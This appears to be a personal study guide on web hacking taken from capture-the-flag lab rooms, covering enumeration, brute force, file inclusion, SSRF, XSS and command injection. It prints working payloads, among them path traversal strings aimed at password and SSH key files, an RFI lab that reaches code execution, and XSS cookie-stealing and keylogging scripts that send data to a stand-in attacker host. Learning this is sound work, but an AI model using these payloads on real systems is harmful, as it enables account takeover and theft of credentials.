# Intro to Web Hacking

## <mark style="color:blue;">Subdomain Enumeration</mark> <a href="#title" id="title"></a>

Subdomain enumeration is the process of finding valid subdomains for a domain. The three basic methods of doing this are:

#### <mark style="color:red;">**Brute Force**</mark>

Bruteforce DNS (Domain Name System) enumeration is the method of trying tens, hundreds, thousands or even millions of different possible subdomains from a pre-defined list of commonly used subdomains. Because this method requires many requests, we automate it with tools to make the process quicker.&#x20;

Use tools such as DNSrecon or Sublist3r (see useful tools page)



#### <mark style="color:red;">**Open-Source Intelligence (OSINT)**</mark>

Using a certificate search site (see two listed in [useful-links.md](useful-links.md "mention")), we can discover subdomains that belong to a domain

Use a command like "-site:www.sitename.com  site:\*.sitename.com**"** to reveal subdomains for the site you name. This search would include only results that lead to the named domain but exclude any links directly to the domain such as ""www.sitename.com". Therefore only subdomains will be shown.



#### <mark style="color:red;">**Virtual Host**</mark>

Some subdomains aren't always hosted in publicly accessible DNS results, such as development versions of a web application or administration portals. Instead, the DNS record could be kept on a private DNS server or recorded on the developer's machines in their /etc/hosts file (or c:\windows\system32\drivers\etc\hosts file for Windows users) which maps domain names to IP addresses.

Use a tool like ffuf (see linked tools) to discover subdomains that do not have a DNS record

{% code overflow="wrap" %}
```
/ffuf -w /usr/share/wordlists/SecLists/Discovery/DNS/namelist.txt -H "Host: FUZZ.domainname.com" -u http://xx.xx.xx.xx
```
{% endcode %}

{% code overflow="wrap" %}
```
ffuf -w /usr/share/wordlists/SecLists/Discovery/DNS/namelist.txt -H "Host: FUZZ.domainname.com" -u http://xx.xx.xx.xx -fs {size}
```
{% endcode %}

In the second example above, the {size} field can be replaced to **filter out** results of the target size.

## <mark style="color:blue;">Authentication Bypass</mark>

Methods by which you can bypass or break authentication protocols.&#x20;

#### <mark style="color:red;">Username Enumeration</mark>

Website error messages are great resources for collating this information to build our list of valid usernames. If you guess a username and fill other fields with garbage, if the website returns something like "This username is already in use", you now know an account exists with that username

Use ffuff to check for existing accounts on a website that returns such an error. The output should include a list of names. If we make a list out of that, we can use it in the next command.

{% code overflow="wrap" %}
```shell-session
ffuf -w /usr/share/wordlists/SecLists/Usernames/Names/names.txt -X POST -d "username=FUZZ&email=x&password=x&cpassword=x" -H "Content-Type: application/x-www-form-urlencoded" -u http://xx.xx.xx.xx/customers/signup -mr "username already exists"
```
{% endcode %}

#### <mark style="color:red;">Brute Force</mark>

This method uses large amounts of guesses to come up with username/password information. In the example below we have a list of usernames that are present on the target. Using ffuf we are able to guess the passwords of these accounts over and over again until a match works. The command is looking for the 200(OK) response from the website to indicate success.&#x20;

{% code overflow="wrap" %}
```
ffuf -w valid_usernames.txt:W1,/usr/share/wordlists/SecLists/Passwords/Common-Credentials/10-million-password-list-top-100.txt:W2 -X POST -d "username=W1&password=W2" -H "Content-Type: application/x-www-form-urlencoded" -u http://xx.xx.xx.xx/somepath/to_a/login_page -fc 200
```
{% endcode %}

#### <mark style="color:red;">Logic Flaw</mark>

Sometimes authentication processes contain logic flaws. A logic flaw is when the typical logical path of an application is either bypassed, circumvented or manipulated by a hacker. Logic flaws can exist in any area of a website

Using curl and other commands to interact with the website will allow you to get unintended information from it if it is configured incorrectly.&#x20;

#### <mark style="color:red;">Cookie Tampering</mark>

Examining and editing the cookies set by the web server during your online session can have multiple outcomes, such as unauthenticated access, access to another user's account, or elevated privileges.

This can be done by editing the cookie contents through hash cracking, encoding compromise, etc.&#x20;

## <mark style="color:blue;">IDOR</mark>

IDOR stands for Insecure Direct Object Reference and is a type of access control vulnerability.

This type of vulnerability can occur when a web server receives user-supplied input to retrieve objects (files, data, documents), too much trust has been placed on the input data, and it is not validated on the server-side to confirm the requested object belongs to the user requesting it.

The most common encoding technique on the web is base64 encoding and can usually be pretty easy to spot. You can use websites like [https://www.base64decode.org/](https://www.base64decode.org/) to decode the string, then edit the data and re-encode it again using [https://www.base64encode.org/](https://www.base64encode.org/) and then resubmit the web request to see if there is a change in the response.

It's worthwhile putting any discovered hashes through a web service such as [https://crackstation.net/](https://crackstation.net/) (which has a database of billions of hash to value results) to see if we can find any matches.

Sometimes endpoints could have an unreferenced parameter that may have been of some use during development and got pushed to production. For example, you may notice a call to **/user/details** displaying your user information (authenticated through your session). But through an attack known as parameter mining, you discover a parameter called **user\_id** that you can use to display other users' information, for example, **/user/details?user\_id=123**

You can inspect a webpage using developers tools and try editing and resending calls that include user identifiers to possibly see other users information.&#x20;



## <mark style="color:blue;">File Inclusion</mark>

Three types of interest:

Local File Inclusion (LFI)

Remote File Inclusion (RFI)

Directory Traversal



In some scenarios, web applications are written to request access to files on a given system, including images, static text, and so on via parameters. Parameters are query parameter strings attached to the URL that could be used to retrieve data or perform actions based on user input. The following graph explains and breaking down the essential parts of the URL.

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/dbf35cc4f35fde7a4327ad8b5a2ae2ec.png)

Example - You want to access your resume on a webpage. The request would look something like:

http://webapp.thm/get.php?file=userCV.pdf

"file" is the parameter and "userResume.pdf" is the file being accessed.&#x20;

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/dc22709e572d5de31ed4effb2ebc161f.png)

#### <mark style="color:red;">Path Traversal</mark>

AKA <mark style="color:red;">Directory Traversal</mark> allows attackers to read OS resources, files, etc.. This commonly occurs when user input handlers are configured incorrectly, allowing them to access content they should not.&#x20;

<figure><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/45d9c1baacda290c1f95858e27f740c9.png" alt=""><figcaption></figcaption></figure>

We can test out the URL parameter by adding payloads to see how the web application behaves. Path traversal attacks, also known as the dot-dot-slash attack, take advantage of moving the directory one step up using the double dots ../. If the attacker finds the entry point, which in this case get.php?file=, then the attacker may send something as follows, http://webapp.thm/get.php?file=../../../../etc/passwd

Similarly, if the web application runs on a Windows server, the attacker needs to provide Windows paths. For example, if the attacker wants to read the boot.ini file located in c:\boot.ini, then the attacker can try the following depending on the target OS version:

http://webapp.thm/get.php?file=../../../../boot.ini or

http://webapp.thm/get.php?file=../../../../windows/win.ini

&#x20;Below are some common OS files you could use when testing.&#x20;

\


| **Location**                | <p><strong>Description</strong><br></p>                                                                                                                           |
| --------------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| /etc/issue                  | <p>contains a message or system identification to be printed before the login prompt.<br></p>                                                                     |
| /etc/profile                | controls system-wide default variables, such as Export variables, File creation mask (umask), Terminal types, Mail messages to indicate when new mail has arrived |
| /proc/version               | <p>specifies the version of the Linux kernel<br></p>                                                                                                              |
| /etc/passwd                 | <p>has all registered user that has access to a system<br></p>                                                                                                    |
| /etc/shadow                 | <p>contains information about the system's users' passwords<br></p>                                                                                               |
| /root/.bash\_history        | <p>contains the history commands for root user<br></p>                                                                                                            |
| /var/log/dmessage           | <p>contains global system messages, including the messages that are logged during system startup<br></p>                                                          |
| /var/mail/root              | all emails for root user                                                                                                                                          |
| /root/.ssh/id\_rsa          | Private SSH keys for a root or any known valid user on the server                                                                                                 |
| /var/log/apache2/access.log | the accessed requests for Apache  webserver                                                                                                                       |
| C:\boot.ini                 | contains the boot options for computers with BIOS firmware                                                                                                        |



<mark style="color:red;">**Local File Inclusion**</mark>

```php
<?PHP 
	include("languages/". $_GET['lang']); 
?>
```

In the above code, the developer decided to use the include function to call PHP pages in the languages directory only via lang parameters.

If there is no input validation, the attacker can manipulate the URL by replacing the lang input with other OS-sensitive files such as /etc/passwd.

Again the payload looks similar to the path traversal, but the include function allows us to include any called files into the current page. The following will be the exploit:

http://webapp.thm/index.php?lang=../../../../etc/passwd

Using null bytes is an injection technique where URL-encoded representation such as %00 or 0x00 in hex with user-supplied data to terminate strings. You could think of it as trying to trick the web app into disregarding whatever comes after the Null Byte.

NOTE: the %00 trick is fixed and not working with PHP 5.3.4 and above.



If the webpage is filtering out inputs like "../", attempt an input like:

....//....//....//....//....//etc/passwd

This works because the PHP filter only matches and replaces the first subset string ../ it finds and doesn't do another pass, leaving what is pictured below.

<figure><img src=".gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>

<mark style="color:red;">**Remote File Inclusion**</mark>

Remote File Inclusion (RFI) is a technique to include remote files and into a vulnerable application. Like LFI, the RFI occurs when improperly sanitizing user input, allowing an attacker to inject an external URL into include function. One requirement for RFI is that the allow\_url\_fopen option needs to be on.

The risk of RFI is higher than LFI since RFI vulnerabilities allow an attacker to gain Remote Command Execution (RCE) on the server. Other consequences of a successful RFI attack include:

```
Sensitive Information Disclosure
Cross-site Scripting (XSS)
Denial of Service (DoS)
```



<mark style="color:red;">File Inclusion Lab Notes</mark>

<mark style="color:green;">Playground</mark>

The lab challenges you to gain remote command execution (RCE) on the playground instance. Do to this we need to host an http server. In the attacking VM, run&#x20;

```
python3 -m http.server
```

This command defaults to hosting the http server on port 8000. If you would like it to be on a different port, run the following command instead.

```
python3 -m http.server
```

Create a php file with the desired command., in this case we want to run the "hostname" command&#x20;

```
<?PHP print exec('hostname'); ?>
```

For context, the IP of the attacking machine that is hosting the http server is 10.6.60.210. The IP of the THM instance is 10.10.10.167/. The http server is set up on 10.6.60.210:8000 and contains a file named gethostname.php

From the browser, navigate to the playground instance. Execute the command:

```
http://10.10.10.167/playground.php?file=http://10.6.60.210:8000/gethostname.php
```

This command will reach out to the http server hosted on the attacking machine and execute the php file named gethostname.php, this executes on the server side, providing you the host name of the machine hosting the playground instance.&#x20;



<mark style="color:green;">Challenge 1</mark>

Challenge 1 is to obtain the flag found in the file /etc/flag1 in the Challege1 instance. To do this you need to utilize BURP to intercept the GET request that is being sent to the server. You need to use BURP to change the GET to a POST with the target /etc/flag1.

Refer to [burp-and-foxyproxy-setup.md](burp-and-foxyproxy-setup.md "mention") for how to setup the necessary tools on your Kali box

With Foxy and Burp running, enter /etc/flag1 into the search bar of the Challenge1 webpage

When you press "Include" on the Challenge1 web page, burp will intercept the request and populate the following information

<figure><img src=".gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>

Right click anywhere in Burp and select "change request method". GET should change to POST

Press "Forward" to send the request on to the server. The webpage should populate with the flag



<mark style="color:green;">Challenge 2</mark>

The second challenge states that it requires that you be admin to access the page. This can be done by using Burp again. Intercept a request and change line 9 from "Guest" to "admin".

It seems that "admin" is case sensitive, so insure you type it right. This request provides a content preview of the admin page, but not the flag. We now know that by changing the cookie parameter in the request we receive a preview of the contents of that page. To get the flag you need to get to /etc/flag2. The webpage tells you the current directory is /var/www/html, so you need to change the cookie to "../../../../etc/flag2%00" in order to access the necessary page.

The null character is needed because the input is looking for a file that ends with ".php", and the null character is used to escape that.&#x20;

<mark style="color:green;"></mark>

<mark style="color:green;">Challenge 3</mark>

Testing inputs here shows that the web server is stripping out everything that is not an alphabetical character.&#x20;

It appears that this is only a limitation on the GET requests, and not POST request. By using Burp to POST&#x20;

"http://10.10.44.69/challenges////chall3.php?file=/etc/flag3%00.php" you get the flag

Note - The null character may not be needed for this particular challenge.&#x20;





## <mark style="color:blue;">Server-Side Request Forgery (SSRF)</mark>

A vulnerability that allows a malicious user to cause the webserver to make an additional or edited HTTP request to the resource of the attacker's choosing

When changing the contents of an address, using \&x= will effectively delete the contents that come after it. In the example below entering the first address will create the server side request

Address: https://website.thm/item/2?server=server.website.thm/flag?id=9\&x=

Server Request: https://server.website.thm/flag?id=9\&x=.website.thm/api/item?id=2

The server then sees "https://server.website.thm/flag?id=9" because the \&x= prevents any of the other content from being utilized.&#x20;



If working with a blind SSRF where no output is reflected back to you, you'll need to use an external HTTP logging tool to monitor requests such as requestbin.com, your own HTTP server or Burp Suite's Collaborator client.

In a cloud environment, it would be beneficial to block access to the IP address 169.254.169.254, which contains metadata for the deployed cloud server, including possibly sensitive information. An attacker can bypass this by registering a subdomain on their own domain with a DNS record that points to the IP Address 169.254.169.254



## <mark style="color:blue;">**Cross-site Scripting (XSS)**</mark>

Cross-Site Scripting, better known as XSS in the cybersecurity community, is classified as an injection attack where malicious JavaScript gets injected into a web application with the intention of being executed by other users.



Proof Of Concept:

This is the simplest of payloads where all you want to do is demonstrate that you can achieve XSS on a website. This is often done by causing an alert box to pop up on the page with a string of text, for example:

`<script>alert('XSS');</script>`



Session Stealing:

Details of a user's session, such as login tokens, are often kept in cookies on the targets machine. The below JavaScript takes the target's cookie, base64 encodes the cookie to ensure successful transmission and then posts it to a website under the hacker's control to be logged. Once the hacker has these cookies, they can take over the target's session and be logged as that user.

```
<script>fetch('https://hacker.thm/steal?cookie=' + btoa(document.cookie));</script>
```



Key Logger:

The below code acts as a key logger. This means anything you type on the webpage will be forwarded to a website under the hacker's control. This could be very damaging if the website the payload was installed on accepted user logins or credit card details.

```
<script>document.onkeypress = function(e) { fetch('https://hacker.thm/log?key=' + btoa(e.key) );}</script>
```



Business Logic:

This payload is a lot more specific than the above examples. This would be about calling a particular network resource or a JavaScript function. For example, imagine a JavaScript function for changing the user's email address called "user.changeEmail()". Your payload could look like this:

```
<script>user.changeEmail('attacker@hacker.thm');</script>
```

Polyglots

An XSS polyglot is a string of text which can escape attributes, tags and bypass filters all in one.

There were multiple examples of how you can go about escaping from web page source code features. The code below encapsulates all of the techniques in one command. The goal of the line is to create an alert on the screen that says "THM"

```
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert('THM') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert('THM')//>\x3e
```



## <mark style="color:blue;">Command Injection</mark>

Command injection is the abuse of an application's behaviour to execute commands on the operating system, using the same privileges that the application on a device is running with. For example, achieving command injection on a web server running as a user named "joe" will execute commands under this "joe" user - and therefore obtain any permissions that "joe" has.

A command injection vulnerability is also known as a "Remote Code Execution" (RCE) because an attacker can trick the application into executing a series of payloads that they provide, without direct access to the machine itself (i.e. an interactive shell). The webserver will process this code and execute it under the privileges and access controls of the user who is running that application.

You can often determine whether or not command injection may occur by the behaviours of an application. Applications that use user input to populate system commands with data can often be combined in unintended behavior. For example, the shell operators ;, & and && will combine two (or more) system commands and execute them both.Command Injection can be detected in mostly one of two ways:

```
Blind command injection
Verbose command injection
```

These two methods have been defined in the table below

<figure><img src=".gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>

The curl command is a great way to test for command injection. This is because you are able to use curl to deliver data to and from an application in your payload. Take this code snippet below as an example, a simple curl payload to an application is possible for command injection.

```
curl http://vulnerable.app/process.php%3Fsearch%3DThe%20Beatles%3B%20whoami
```















## <mark style="color:blue;">SQL Injection</mark>
